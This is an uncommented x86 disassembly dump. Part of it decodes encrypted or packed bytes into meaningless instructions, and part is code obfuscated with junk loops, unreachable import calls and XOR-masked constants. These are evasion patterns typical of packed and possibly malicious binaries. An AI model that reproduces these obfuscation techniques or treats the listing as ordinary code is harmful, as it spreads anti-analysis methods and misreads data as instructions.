  41379d:	fisubr DWORD PTR [ebp-0x3c5f0a79]
  4137a3:	cs jo  0x4137ab
  4137a6:	sahf   
  4137a7:	push   0xffffffd1
  4137a9:	xor    DWORD PTR [edi-0x76fbdc06],ebx
  4137af:	out    0xf5,eax
  4137b1:	retf   0x83a0
  4137b4:	sub    dh,dl
  4137b6:	fisubr WORD PTR [edi-0x5c1ac27d]
  4137bc:	adc    ebp,edx
  4137be:	ss mov ebx,0x1c087e33
  4137c4:	das    
  4137c5:	imul   ebx,edx,0xfffffff9
  4137c8:	sub    BYTE PTR [ebx+0x662eb87c],ah
  4137ce:	fstp   TBYTE PTR [eax-0x3a26d4e8]
  4137d4:	add    edx,DWORD PTR [edx+0x2c]
  4137d7:	xchg   edx,eax
  4137d8:	in     eax,dx
  4137d9:	ffreep st(1)
  4137db:	rcr    dl,1
  4137dd:	popf   
  4137de:	pop    ds
  4137df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e0:	lea    esp,[ebp+0x2a0325d7]
  4137e6:	sub    BYTE PTR [edx-0x7d57ce87],bl
  4137ec:	jmp    0xd6bdb930
  4137f1:	shr    BYTE PTR [edi],1
  4137f3:	data16 mov dh,0xb7
  4137f6:	mov    al,ds:0x97e2e231
  4137fb:	ins    DWORD PTR es:[edi],dx
  4137fc:	cwde   
  4137fd:	mov    al,ds:0x7cd24dc2
  413802:	dec    cx
  413804:	aas    
  413805:	lods   eax,DWORD PTR ds:[esi]
  413806:	ss jno 0x41379c
  413809:	jg     0x4137c3
  41380b:	sbb    DWORD PTR [ecx-0x768cba08],0xa64af4ad
  413815:	jbe    0x4137b9
  413817:	mov    ds:0x27cd2cf1,eax
  41381c:	pop    edx
  41381d:	adc    al,0xe
  41381f:	(bad)  
  413820:	lods   al,BYTE PTR ds:[esi]
  413821:	sub    dh,BYTE PTR [eax-0x2eaa2969]
  413827:	fld    TBYTE PTR [ebp+edx*8-0x37]
  41382b:	clc    
  41382c:	sbb    al,0x62
  41382e:	or     dl,BYTE PTR [edx]
  413830:	cdq    
  413831:	pop    esi
  413832:	loope  0x41389a
  413834:	dec    eax
  413835:	ret    
  413836:	int3   
  413837:	cmp    BYTE PTR [ebx+0x75],ah
  41383a:	fmul   st,st(1)
  41383c:	push   es
  41383d:	cmp    cl,BYTE PTR [eax+0x11c3c635]
  413843:	into   
  413844:	ror    al,0x3e
  413847:	pop    eax
  413848:	shl    BYTE PTR [edx-0x6a],1
  41384b:	stc    
  41384c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41384d:	pusha  
  41384e:	xor    al,0x68
  413850:	mov    DWORD PTR [ebp+0x55],edi
  413853:	mov    bl,0x1e
  413855:	mov    al,0x5c
  413857:	test   al,0xed
  413859:	ins    BYTE PTR es:[edi],dx
  41385a:	ins    DWORD PTR es:[edi],dx
  41385b:	fcos   
  41385d:	sbb    al,0x23
  41385f:	sbb    DWORD PTR [ebx+0x562b24b4],eax
  413865:	outs   dx,BYTE PTR ds:[esi]
  413866:	mov    bh,0x9f
  413868:	and    dl,BYTE PTR [si+0x28ed]
  41386d:	js     0x4138eb
  41386f:	lds    ebp,FWORD PTR [edi+0x3d]
  413872:	mov    al,cs:0x7fd19f5
  413878:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41387a:	repnz lods al,BYTE PTR ds:[esi]
  41387c:	in     eax,0x7e
  41387e:	pop    ecx
  41387f:	not    ebp
  413881:	add    eax,0x8fa914ef
  413886:	push   cs
  413887:	les    edx,FWORD PTR [ebp+0x1b]
  41388a:	dec    edx
  41388b:	dec    esi
  41388c:	sbb    BYTE PTR [eax+0x33ac4f12],al
  413892:	cmp    cl,BYTE PTR [edx+0x5]
  413895:	xchg   ebp,eax
  413896:	loopne 0x4138eb
  413898:	push   ss
  413899:	in     eax,dx
  41389a:	mov    ch,0x33
  41389c:	cmp    ebx,0xe9f99e6f
  4138a2:	push   0x14
  4138a4:	fistp  WORD PTR [ebp-0x36]
  4138a7:	mov    ds:0x5258d485,al
  4138ac:	mov    ebp,0xc23685d7
  4138b1:	frstor cs:[edx+ecx*2-0x7bf03fa]
  4138b9:	push   0xffffffbd
  4138bb:	fs inc ebp
  4138bd:	adc    al,0x3a
  4138bf:	sahf   
  4138c0:	xor    al,BYTE PTR [ebx]
  4138c2:	xchg   BYTE PTR [ebx],bl
  4138c4:	out    0xcb,eax
  4138c6:	aas    
  4138c7:	and    eax,0x40ca5d21
  4138cc:	cli    
  4138cd:	pushf  
  4138ce:	pop    edx
  4138cf:	xchg   ecx,eax
  4138d0:	shl    DWORD PTR [esi+0x600ae4c6],cl
  4138d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d7:	cmp    dh,BYTE PTR [esi-0x68]
  4138da:	pushf  
  4138db:	dec    esi
  4138dc:	addr16 cmp eax,0x7e250abb
  4138e2:	dec    eax
  4138e3:	(bad)  
  4138e4:	loopne 0x41389e
  4138e6:	cld    
  4138e7:	js     0x413923
  4138e9:	(bad)  
  4138ea:	test   eax,0xddf20b10
  4138ef:	call   0x91c8:0x6e2f7eba
  4138f6:	nop
  4138f7:	xchg   edi,eax
  4138f8:	test   BYTE PTR [ebx],0x25
  4138fb:	test   BYTE PTR [ebx-0x1b],0x79
  4138ff:	inc    ebp
  413900:	les    edx,FWORD PTR [eax]
  413902:	adc    DWORD PTR [ebx-0x7a5cc765],esi
  413908:	int3   
  413909:	aad    0xa6
  41390b:	out    0x8a,al
  41390d:	test   eax,0xec3e7d25
  413912:	xlat   BYTE PTR ds:[ebx]
  413913:	cdq    
  413914:	or     eax,0x3c78845f
  413919:	xor    eax,0xf1b0eb88
  41391e:	mov    ecx,0x3db2ca48
  413923:	jmp    0xd31c:0xfa6c306e
  41392a:	in     al,0x9d
  41392c:	or     eax,0x33181a96
  413931:	fisttp WORD PTR [esi+0x51]
  413934:	int    0x62
  413936:	jne    0x413907
  413938:	add    edx,0xeb42d59c
  41393e:	dec    eax
  41393f:	mov    ds,WORD PTR [ebx+0x73]
  413942:	xor    ecx,eax
  413944:	add    ecx,edi
  413946:	adc    ch,BYTE PTR [eax-0x3c]
  413949:	cli    
  41394a:	repnz push ebx
  41394c:	les    esi,FWORD PTR [ebx-0x33]
  41394f:	(bad)  
  413950:	loope  0x413974
  413952:	sbb    eax,0x2a9ae364
  413957:	push   0x5df38480
  41395c:	xor    ebx,DWORD PTR ds:0x1c1b2655
  413962:	jns    0x413916
  413964:	out    dx,al
  413965:	mov    dh,BYTE PTR [edx-0x33]
  413968:	std    
  413969:	neg    ecx
  41396b:	ins    DWORD PTR es:[edi],dx
  41396c:	rcl    al,cl
  41396e:	je     0x413912
  413970:	mov    ebx,0xdeb2b852
  413975:	mov    bl,0x1b
  413977:	sar    BYTE PTR [ebx-0x6e878016],1
  41397d:	pop    edi
  41397e:	xchg   esp,eax
  41397f:	in     al,0x80
  413981:	aam    0x6c
  413983:	jnp    0x41396d
  413985:	inc    eax
  413986:	fsub   QWORD PTR [ecx+0x74]
  413989:	mov    BYTE PTR [ecx-0x67],ch
  41398c:	push   cs
  41398d:	stos   BYTE PTR es:[edi],al
  41398e:	xchg   DWORD PTR [ecx-0x2e901f51],esi
  413994:	shl    BYTE PTR ds:0x376514f8,1
  41399a:	mov    esi,DWORD PTR [ebp+0x1d]
  41399d:	call   0x3f5:0x4a510fe9
  4139a4:	or     ch,BYTE PTR [ecx-0x32]
  4139a7:	cs xchg esi,eax
  4139a9:	data16 lahf 
  4139ab:	test   esi,ecx
  4139ad:	mov    cl,0x8c
  4139af:	jae    0x413a2c
  4139b1:	mov    WORD PTR [esi+0x73],cs
  4139b4:	jb     0x4139bd
  4139b6:	pop    ss
  4139b7:	or     al,0xd2
  4139b9:	lods   al,BYTE PTR ds:[esi]
  4139ba:	rcl    DWORD PTR [edx],0xf6
  4139bd:	or     cl,ah
  4139bf:	fadd   st(0),st
  4139c1:	les    edi,FWORD PTR [esi]
  4139c3:	aam    0xdf
  4139c5:	push   edx
  4139c6:	push   cs
  4139c7:	out    dx,al
  4139c8:	cmp    edi,DWORD PTR [ebx]
  4139ca:	mov    al,ds:0xa5aa2466
  4139cf:	outs   dx,DWORD PTR ds:[esi]
  4139d0:	retf   
  4139d1:	push   edi
  4139d2:	adc    ah,BYTE PTR [esi-0x7165b1c4]
  4139d8:	jno    0x41395d
  4139da:	sbb    eax,0x39b20ece
  4139df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139e0:	retf   0x50b4
  4139e3:	xchg   edx,eax
  4139e4:	sbb    al,0x24
  4139e6:	or     al,0x45
  4139e8:	daa    
  4139e9:	mov    esi,0x43d88cd3
  4139ee:	cmp    al,0xc8
  4139f0:	mov    edx,0xe1d311e7
  4139f5:	test   eax,0x941a6873
  4139fa:	mov    ch,0xdc
  4139fc:	ins    DWORD PTR es:[edi],dx
  4139fd:	jmp    FWORD PTR [ebx+0x41d0aaa0]
  413a03:	neg    DWORD PTR [ebp-0x58a8a228]
  413a09:	loopne 0x4139ea
  413a0b:	mov    esi,0x77f57a3e
  413a10:	mov    edi,0x5717c9e3
  413a15:	xlat   BYTE PTR ds:[ebx]
  413a16:	nop
  413a17:	jns    0x413a54
  413a19:	jmp    0x210cfb3a
  413a1e:	lock jle 0x413a1c
  413a21:	cmc    
  413a22:	fmul   DWORD PTR [eax+0x63df174d]
  413a28:	scas   al,BYTE PTR es:[edi]
  413a29:	test   BYTE PTR [esi-0x1e1fa484],bl
  413a2f:	inc    esp
  413a30:	lock je 0x413aa6
  413a33:	xchg   BYTE PTR [esi+eax*2+0x55],cl
  413a37:	iret   
  413a38:	sar    esp,1
  413a3a:	ins    BYTE PTR es:[edi],dx
  413a3b:	adc    DWORD PTR ds:0x2d801c60,edx
  413a41:	es aam 0xaf
  413a44:	xchg   ecx,eax
  413a45:	popf   
  413a46:	mov    esp,0xad22ddab
  413a4b:	jg     0x413a72
  413a4d:	mov    edi,0x6be67e14
  413a52:	sbb    DWORD PTR [edx-0x1123d9d9],0x3914c47d
  413a5c:	mov    dh,0x5a
  413a5e:	adc    al,0xc5
  413a60:	mov    BYTE PTR [edx+ebx*8-0x3e9a92a4],bl
  413a67:	jge    0x413ac6
  413a69:	out    0x13,eax
  413a6b:	inc    esp
  413a6c:	in     al,dx
  413a6d:	inc    ebx
  413a6e:	sub    al,0x82
  413a70:	nop
  413a71:	dec    ebx
  413a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a73:	rol    DWORD PTR [ebx+0xc],0x5f
  413a77:	jno    0x413acf
  413a79:	icebp  
  413a7a:	xor    ecx,ebp
  413a7c:	mov    ebx,0x8c7863ff
  413a81:	xchg   ebp,esi
  413a83:	adc    al,0x98
  413a85:	sub    edi,esp
  413a87:	subps  xmm7,XMMWORD PTR [edi]
  413a8a:	(bad)  
  413a8b:	loopne 0x413a5c
  413a8d:	dec    ebx
  413a8e:	jno    0x413ad5
  413a90:	inc    edx
  413a91:	jo     0x413b11
  413a93:	(bad)  [ebx+0x33]
  413a96:	add    esp,DWORD PTR [ecx]
  413a98:	dec    esp
  413a99:	xor    DWORD PTR [esi+0x57faa851],esi
  413a9f:	jb     0x413a72
  413aa1:	push   esp
  413aa2:	mov    cl,al
  413aa4:	retf   
  413aa5:	xor    eax,0xdae95926
  413aaa:	push   0xd
  413aac:	fiadd  WORD PTR [ebx]
  413aae:	cdq    
  413aaf:	outs   dx,BYTE PTR fs:[esi]
  413ab1:	jb     0x413ae8
  413ab3:	dec    edx
  413ab4:	mov    DWORD PTR [eax-0x72b5b962],edx
  413aba:	inc    edx
  413abb:	xor    eax,0xd9fa0420
  413ac0:	data16 stc 
  413ac2:	and    eax,0xbae611d5
  413ac7:	cmp    eax,0x94f26bf8
  413acc:	(bad)  [eax-0x755895da]
  413ad2:	sar    BYTE PTR [esi-0x15815ecd],1
  413ad8:	mov    al,ds:0x856440bb
  413add:	fldcw  WORD PTR [ecx+0x7]
  413ae0:	retf   0x1fac
  413ae3:	dec    ebp
  413ae4:	fdivr  DWORD PTR [ebp-0x4]
  413ae7:	cmp    ebx,DWORD PTR [edx-0x777e7521]
  413aed:	mov    bl,0xfa
  413aef:	repz inc edx
  413af1:	(bad)  
  413af2:	fsub   DWORD PTR [ecx]
  413af4:	push   ecx
  413af5:	into   
  413af6:	loop   0x413a7a
  413af8:	mov    edx,0xd8be76e5
  413afd:	adc    BYTE PTR [ecx+edx*4],dh
  413b00:	pop    esi
  413b01:	push   ebp
  413b02:	dec    edx
  413b03:	dec    esi
  413b04:	add    eax,0xdefdd9fa
  413b09:	in     eax,0x1d
  413b0b:	pop    eax
  413b0c:	(bad)  
  413b0d:	xchg   bh,bl
  413b0f:	call   0xebc9cb5b
  413b14:	inc    ebx
  413b15:	mov    edx,0x240aa92d
  413b1a:	movups xmm0,XMMWORD PTR [esi+0x3]
  413b1e:	sahf   
  413b1f:	sahf   
  413b20:	mov    dh,0x8d
  413b22:	out    0x61,eax
  413b24:	push   cs
  413b25:	iret   
  413b26:	jne    0x413b56
  413b28:	fwait
  413b29:	scas   al,BYTE PTR es:[edi]
  413b2a:	out    dx,eax
  413b2b:	mov    dl,0xe7
  413b2d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b2f:	sbb    esp,DWORD PTR [ebp-0x69e6d755]
  413b35:	retf   
  413b36:	xor    BYTE PTR [edi],dh
  413b38:	adc    cl,BYTE PTR [edx]
  413b3a:	imul   eax,DWORD PTR [edi-0x4b],0xffffff8e
  413b3e:	ret    0xe795
  413b41:	(bad)  
  413b42:	xchg   ebx,eax
  413b43:	into   
  413b44:	das    
  413b45:	dec    edx
  413b46:	pop    ebp
  413b47:	scas   eax,DWORD PTR es:[edi]
  413b48:	adc    ebx,DWORD PTR [edi+ecx*8+0x22]
  413b4c:	xor    bl,BYTE PTR [eax+edx*1]
  413b4f:	test   al,0xea
  413b51:	pop    edi
  413b52:	push   es
  413b53:	jle    0x413bc6
  413b55:	inc    esp
  413b57:	ja     0x413b7a
  413b59:	mov    BYTE PTR [eax+0x74],0x41
  413b5d:	aas    
  413b5e:	cmc    
  413b5f:	shr    BYTE PTR [edi],cl
  413b61:	mov    ebp,0xd831a79f
  413b66:	call   0xdb7b:0x4acd1d20
  413b6d:	pusha  
  413b6e:	js     0x413b48
  413b70:	aas    
  413b71:	push   eax
  413b72:	daa    
  413b73:	stos   DWORD PTR es:[edi],eax
  413b74:	aam    0x13
  413b76:	jp     0x413bd1
  413b78:	shr    BYTE PTR [ebp+0x5b],0x46
  413b7c:	push   ss
  413b7d:	es ins DWORD PTR es:[edi],dx
  413b7f:	cwde   
  413b80:	push   eax
  413b81:	mov    edx,0x1a99765f
  413b86:	xor    DWORD PTR [ebx+0x74],ecx
  413b89:	hlt    
  413b8a:	cld    
  413b8b:	nop
  413b8c:	inc    edi
  413b8d:	arpl   WORD PTR [edx],bp
  413b8f:	mov    eax,ds:0xc972f9b
  413b94:	in     eax,dx
  413b95:	sub    bh,dh
  413b97:	cmp    BYTE PTR [ebx-0x4a],bh
  413b9a:	push   edi
  413b9b:	retf   0x3482
  413b9e:	iret   
  413b9f:	scas   al,BYTE PTR es:[edi]
  413ba0:	mov    edx,esi
  413ba2:	test   BYTE PTR [esi+0x37],0x5a
  413ba6:	pop    es
  413ba7:	push   esi
  413ba8:	retf   
  413ba9:	sbb    eax,0x5897a707
  413bae:	(bad)  
  413baf:	into   
  413bb0:	cmp    ebp,eax
  413bb2:	jae    0x413b9b
  413bb4:	out    dx,eax
  413bb5:	imul   edi,DWORD PTR [esi],0xffffffe7
  413bb8:	push   eax
  413bb9:	cmp    BYTE PTR ds:0x660170ec,cl
  413bbf:	mov    al,ds:0xb11e2720
  413bc4:	cmp    ch,dh
  413bc6:	mov    DWORD PTR [edi],ebx
  413bc8:	push   ecx
  413bc9:	sti    
  413bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bcb:	mov    fs,ecx
  413bcd:	imul   esi,ebx,0x5e
  413bd0:	ror    BYTE PTR [edx+0x17afbc6a],1
  413bd6:	clc    
  413bd7:	xchg   edx,eax
  413bd8:	xor    BYTE PTR [eax+0x4a32638e],al
  413bde:	stos   DWORD PTR es:[edi],eax
  413bdf:	nop
  413be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be1:	push   esp
  413be2:	fwait
  413be3:	adc    ebx,DWORD PTR [edi]
  413be5:	retf   
  413be6:	cmp    ch,BYTE PTR gs:[edx-0x287c2efd]
  413bed:	push   DWORD PTR [ebx]
  413bef:	rol    BYTE PTR [ebx-0x29c4ff09],1
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421cd2
  413c08:	mov    ds:0x421cda,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421aa2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423868
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a6e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423883
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423946
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a66
  413f9e:	mov    eax,ds:0x421a76
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ace
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c56
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239c0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
